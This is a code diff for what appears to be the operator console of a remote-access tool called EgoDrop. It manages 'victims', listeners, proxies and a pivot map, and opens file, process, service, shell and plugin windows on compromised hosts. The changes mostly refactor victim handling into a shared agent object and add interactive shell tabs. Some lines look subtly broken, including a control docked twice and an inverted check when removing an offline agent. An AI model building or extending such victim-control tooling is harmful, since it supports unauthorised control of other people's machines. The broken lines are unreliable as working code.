@@ -25,6 +25,14 @@ namespace EgoDrop
             m_iniMgr = new clsIniMgr("config.ini"); //IniMgr object.
         }
 
+        private enum enGroup
+        {
+            All,
+            Orphan,
+            Offline,
+        }
+        private Dictionary<enGroup, TreeNode> m_dicGroupTreeNode = new Dictionary<enGroup, TreeNode>();
+
         #region Tools
 
         /// <summary>
@@ -53,11 +61,58 @@ namespace EgoDrop
         private string fnszGetVictimID(ListViewItem item) => item.SubItems[1].Text;
 
         /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="item"></param>
+        /// <returns></returns>
+        private clsAgent fnGetAgentFromTag(ListViewItem item)
+        {
+            if (item.Tag == null)
+                return null;
+
+            clsVictim victim = fnGetVictimFromTag(item);
+            if (victim == null)
+                return null;
+
+            string szUriName = $"{item.SubItems[4].Text}@{item.SubItems[3].Text}";
+
+            clsAgent agent = new clsAgent(victim.m_listener, victim, item.SubItems[1].Text, szUriName, fnbIsUnixLike(item));
+
+            return agent;
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="szVictimID"></param>
+        /// <returns></returns>
+        private clsAgent fnGetAgentWithID(string szVictimID)
+        {
+            ListViewItem item = listView1.FindItemWithText(szVictimID, true, 0);
+            if (item == null)
+                return null;
+
+            return fnGetAgentFromTag(item);
+        }
+
+        /// <summary>
         /// Check victim is Unix-like.
         /// </summary>
         /// <param name="item"></param>
         /// <returns></returns>
         private bool fnbIsUnixLike(ListViewItem item) => !item.SubItems[7].Text.ToLower().Contains("windows");
+
+
+        private TabPage fnFindInteractTab(clsAgent agent)
+        {
+            foreach (TabPage page in tabControl1.TabPages)
+            {
+                if (string.Equals(page.Text, agent.m_szVictimID))
+                    return page;
+            }
+
+            return null;
+        }
 
         #endregion
         #region Controls
@@ -170,6 +225,30 @@ namespace EgoDrop
             nodeProxy.Expand();
         }
 
+        TabPage fnCreateNewInteractPage(clsAgent agent, bool bAdd = true)
+        {
+            TabPage page = new TabPage(agent.m_szUriName);
+            RichTextBox rb = new RichTextBox()
+            {
+                BackColor = Color.Black,
+                ForeColor = Color.White,
+            };
+            TextBox tb = new TextBox();
+
+            page.Controls.Add(rb);
+            page.Controls.Add(tb);
+
+            rb.Dock = DockStyle.Fill;
+            rb.Dock = DockStyle.Bottom;
+
+            rb.BringToFront();
+
+            if (bAdd)
+                tabControl1.TabPages.Add(page);
+
+            return page;
+        }
+
         #endregion
         #region Events
 
@@ -178,14 +257,14 @@ namespace EgoDrop
         /// </summary>
         /// <param name="ltn"></param>
         /// <param name="vic"></param>
-        public void fnOnNewVictim(clsListener ltn, clsVictim vic)
+        public void fnOnNewVictim(clsListener ltn, clsAgent agent)
         {
-            Socket sktClnt = vic.m_sktClnt;
             try
             {
                 Invoke(new Action(() =>
                 {
-                    //Add to group,
+                    if (!m_dicAgent.ContainsKey(agent.m_szVictimID))
+                        m_dicAgent[agent.m_szVictimID] = agent;
                 }));
             }
             catch (Exception ex)
@@ -232,10 +311,10 @@ namespace EgoDrop
 
                         listView1.Items.Add(item);
 
+                        string szUriName = $"{lsMsg[5]}@{lsMsg[3]}";
+
+                        fnOnNewVictim(ltn, new clsAgent(ltn, victim, szID, szUriName, fnbIsUnixLike(item)));
                         fnSysLogOK($"New victim[{szID}]"); //Write new log message.
-
-                        //todo: Add to group treeview.
-
                     }
                     else
                     {
@@ -255,10 +334,10 @@ namespace EgoDrop
 
                         if (nCode == 1)
                         {
-                            Node node = networkView1.FindNodeWithID(szSrcVictimID);
+                            NetworkNode node = networkView1.FindNodeWithID(szSrcVictimID);
                             if (node == null)
                             {
-                                clsTools.fnShowErrMsgbox("Node is null.");
+                                clsTools.fnShowErrMsgbox("NetworkNode is null.");
                                 return;
                             }
 
@@ -319,7 +398,7 @@ namespace EgoDrop
 
                         if (nCode == 1)
                         {
-                            Node node = networkView1.FindNodeWithID(szSrcVictimID);
+                            NetworkNode node = networkView1.FindNodeWithID(szSrcVictimID);
                             ListViewItem item = listView1.FindItemWithText(szSrcVictimID, true, 0);
 
                             if (item == null)
@@ -419,6 +498,10 @@ namespace EgoDrop
                     if (clsTools.fnbSameVictim(vic, fnGetVictimFromTag(item)) && string.Equals(item.SubItems[1].Text, szVictimID))
                     {
                         listView1.Items.Remove(item);
+                        
+                        if (!m_dicAgent.ContainsKey(szVictimID))
+                            m_dicAgent.Remove(szVictimID);
+
                         fnSysLogInfo($"Offline[{szVictimID}]");
                     }
                 }
@@ -431,10 +514,10 @@ namespace EgoDrop
                 treeView2.Nodes.Remove(tNode);
 
                 //Remove from networkview.
-                Node node = networkView1.FindNodeWithID(szVictimID);
+                NetworkNode node = networkView1.FindNodeWithID(szVictimID);
                 networkView1.RemoveNode(node);
 
-                Node firewallNode = networkView1.FindNodeWithName($"Firewall@{vic.m_sktClnt.RemoteEndPoint}");
+                NetworkNode firewallNode = networkView1.FindNodeWithName($"Firewall@{vic.m_sktClnt.RemoteEndPoint}");
                 if (firewallNode == null)
                     return;
 
@@ -485,7 +568,7 @@ namespace EgoDrop
         }
 
         /// <summary>
-        /// 
+        /// Add agent chain to NetworkView.
         /// </summary>
         /// <param name="listener"></param>
         /// <param name="lsVictim"></param>
@@ -601,8 +684,9 @@ namespace EgoDrop
                                 status = NetworkView.enMachineStatus.Windows_Super;
                         }
 
-                        var n1 = networkView1.AddNode($"{szVictim}", $"{szUsername}@{szIPv4}", status);
-                        n1.Agent = new clsAgent(listener, victim, szVictim, fnbIsUnixlike(szOS));
+                        string szUriName = $"{szUsername}@{szIPv4}";
+                        var n1 = networkView1.AddNode($"{szVictim}", szUriName, status);
+                        n1.Agent = m_dicAgent[szVictim];
 
                         victim.fnAddVictimChain(szVictim, lsVictim[..(i + 1)]);
 
@@ -710,6 +794,10 @@ namespace EgoDrop
         private void fnSetup()
         {
             //Load groups
+            m_dicGroupTreeNode.Add(enGroup.All, treeView1.Nodes[0]);
+            m_dicGroupTreeNode.Add(enGroup.Orphan, treeView1.Nodes[1]);
+            m_dicGroupTreeNode.Add(enGroup.Offline, treeView1.Nodes[2]);
+
             List<string> lsGroup = m_sqlite.fnlsGetGroups();
             foreach (string szName in lsGroup)
             {
@@ -787,12 +875,11 @@ namespace EgoDrop
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                string szVictimID = fnszGetVictimID(item);
-                clsVictim victim = fnGetVictimFromTag(item);
-                frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim, szVictimID);
+                clsAgent agent = fnGetAgentFromTag(item);
+                frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(agent);
                 if (f == null)
                 {
-                    f = new frmFileMgr(szVictimID, victim, fnbIsUnixLike(item));
+                    f = new frmFileMgr(agent);
                     f.Show();
                 }
                 else
@@ -807,12 +894,9 @@ namespace EgoDrop
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                string szVictimID = fnszGetVictimID(item);
-                clsVictim victim = fnGetVictimFromTag(item);
+                clsAgent agent = fnGetAgentFromTag(item);
 
-                clsAgent agent = new clsAgent(victim.m_listener, victim, szVictimID, fnbIsUnixLike(item));
-
-                frmProcMgr f = clsTools.fnFindForm<frmProcMgr>(victim, szVictimID);
+                frmProcMgr f = clsTools.fnFindForm<frmProcMgr>(agent);
                 if (f == null)
                 {
                     f = new frmProcMgr(agent);
@@ -830,11 +914,9 @@ namespace EgoDrop
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                string szVictimID = fnszGetVictimID(item);
-                clsVictim victim = fnGetVictimFromTag(item);
-                clsAgent agent = new clsAgent(victim.m_listener, victim, szVictimID, fnbIsUnixLike((item)));
+                clsAgent agent = fnGetAgentFromTag(item);
 
-                frmSrvMgr f = clsTools.fnFindForm<frmSrvMgr>(victim, szVictimID);
+                frmSrvMgr f = clsTools.fnFindForm<frmSrvMgr>(agent);
                 if (f == null)
                 {
                     f = new frmSrvMgr(agent);
@@ -873,12 +955,11 @@ namespace EgoDrop
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                string szVictimID = fnszGetVictimID(item);
-                clsVictim victim = fnGetVictimFromTag(item);
-                frmShell f = clsTools.fnFindForm<frmShell>(victim, szVictimID);
+                clsAgent agent = fnGetAgentFromTag(item);
+                frmShell f = clsTools.fnFindForm<frmShell>(agent);
                 if (f == null)
                 {
-                    f = new frmShell(victim, szVictimID);
+                    f = new frmShell(agent);
                     f.Show();
                 }
                 else
@@ -895,23 +976,16 @@ namespace EgoDrop
 
         private void toolStripMenuItem13_Click(object sender, EventArgs e)
         {
-            Node node = networkView1.SelectedNode;
+            NetworkNode node = networkView1.SelectedNode;
             if (node == null)
                 return;
 
-            string szID = node.szVictimID;
-            clsVictim victim = fnGetVictimWithID(szID);
-            if (victim == null)
-                return;
+            clsAgent agent = node.Agent;
 
-            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
-            if (item == null)
-                return;
-
-            frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim, szID);
+            frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(agent);
             if (f == null)
             {
-                f = new frmFileMgr(szID, victim, fnbIsUnixLike(item));
+                f = new frmFileMgr(agent);
                 f.Show();
             }
             else
@@ -937,7 +1011,7 @@ namespace EgoDrop
         {
             if (e.Button == MouseButtons.Right)
             {
-                Node node = networkView1.SelectedNode;
+                NetworkNode node = networkView1.SelectedNode;
                 if (node == null)
                     return;
 
@@ -973,12 +1047,12 @@ namespace EgoDrop
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                string szVictimID = fnszGetVictimID(item);
-                clsVictim victim = fnGetVictimFromTag(item);
-                frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim, szVictimID);
+                clsAgent agent = fnGetAgentFromTag(item);
+
+                frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(agent);
                 if (f == null)
                 {
-                    f = new frmFileMgr(szVictimID, victim, fnbIsUnixLike(item));
+                    f = new frmFileMgr(agent);
                     f.Show();
                 }
                 else
@@ -990,23 +1064,16 @@ namespace EgoDrop
 
         private void toolStripMenuItem16_Click(object sender, EventArgs e)
         {
-            Node node = networkView1.SelectedNode;
+            NetworkNode node = networkView1.SelectedNode;
             if (node == null)
                 return;
 
-            string szID = node.szVictimID;
-            clsVictim victim = fnGetVictimWithID(szID);
-            if (victim == null)
-                return;
+            clsAgent agent = node.Agent;
 
-            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
-            if (item == null)
-                return;
-
-            frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim, szID);
+            frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(agent);
             if (f == null)
             {
-                f = new frmFileMgr(szID, victim, fnbIsUnixLike(item));
+                f = new frmFileMgr(agent);
                 f.Show();
             }
             else
@@ -1035,23 +1102,14 @@ namespace EgoDrop
 
         private void toolStripMenuItem19_Click(object sender, EventArgs e)
         {
-            Node node = networkView1.SelectedNode;
+            NetworkNode node = networkView1.SelectedNode;
             if (node == null)
                 return;
 
-            string szID = node.szVictimID;
-            clsVictim victim = fnGetVictimWithID(szID);
-            if (victim == null)
-                return;
-
-            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
-            if (item == null)
-                return;
-
-            frmShell f = clsTools.fnFindForm<frmShell>(victim, szID);
+            frmShell f = clsTools.fnFindForm<frmShell>(node.Agent);
             if (f == null)
             {
-                f = new frmShell(victim, szID);
+                f = new frmShell(node.Agent);
                 f.Show();
             }
             else
@@ -1064,12 +1122,11 @@ namespace EgoDrop
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                string szVictimID = fnszGetVictimID(item);
-                clsVictim victim = fnGetVictimFromTag(item);
-                frmShell f = clsTools.fnFindForm<frmShell>(victim, szVictimID);
+                clsAgent agent = fnGetAgentFromTag(item);
+                frmShell f = clsTools.fnFindForm<frmShell>(agent);
                 if (f == null)
                 {
-                    f = new frmShell(victim, szVictimID);
+                    f = new frmShell(agent);
                     f.Show();
                 }
                 else
@@ -1081,23 +1138,14 @@ namespace EgoDrop
 
         private void toolStripMenuItem25_Click(object sender, EventArgs e)
         {
-            Node node = networkView1.SelectedNode;
+            NetworkNode node = networkView1.SelectedNode;
             if (node == null)
                 return;
 
-            string szID = node.szVictimID;
-            clsVictim victim = fnGetVictimWithID(szID);
-            if (victim == null)
-                return;
-
-            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
-            if (item == null)
-                return;
-
-            frmShell f = clsTools.fnFindForm<frmShell>(victim, szID);
+            frmShell f = clsTools.fnFindForm<frmShell>(node.Agent);
             if (f == null)
             {
-                f = new frmShell(victim, szID);
+                f = new frmShell(node.Agent);
                 f.Show();
             }
             else
@@ -1114,7 +1162,7 @@ namespace EgoDrop
 
         private void toolStripMenuItem27_Click(object sender, EventArgs e)
         {
-            Node node = networkView1.SelectedNode;
+            NetworkNode node = networkView1.SelectedNode;
             if (node == null)
                 return;
 
@@ -1136,7 +1184,7 @@ namespace EgoDrop
 
         private void toolStripMenuItem28_Click(object sender, EventArgs e)
         {
-            Node node = networkView1.SelectedNode;
+            NetworkNode node = networkView1.SelectedNode;
             if (node == null)
                 return;
 
@@ -1163,6 +1211,8 @@ namespace EgoDrop
 
             foreach (string szName in m_dicLtnProxy.Keys)
                 m_dicLtnProxy[szName].fnStop();
+
+            timer1.Stop();
         }
 
         private void toolStripButton3_Click(object sender, EventArgs e)
@@ -1181,6 +1231,38 @@ namespace EgoDrop
                 $"Agent[{listView1.Items.Count}] - Selected[{listView1.SelectedItems.Count}] | " +
                 $"Listener[{m_dicListener.Count}] | " +
                 $"Proxy[{m_dicLtnProxy.Count}]";
+        }
+
+        private void toolStripMenuItem29_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStripMenuItem30_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                string szID = item.SubItems[1].Text;
+
+                clsAgent agent = m_dicAgent[szID];
+
+                frmPluginMgr f = new frmPluginMgr(this, agent);
+
+                f.Show();
+            }
+        }
+
+        private void toolStripMenuItem31_Click(object sender, EventArgs e)
+        {
+            NetworkNode node = networkView1.SelectedNode;
+            if (node == null)
+                return;
+
+            TabPage page = fnFindInteractTab(node.Agent);
+            if (page == null)
+                page = fnCreateNewInteractPage(node.Agent);
+
+            tabControl1.SelectedTab = page;
         }
     }
 }
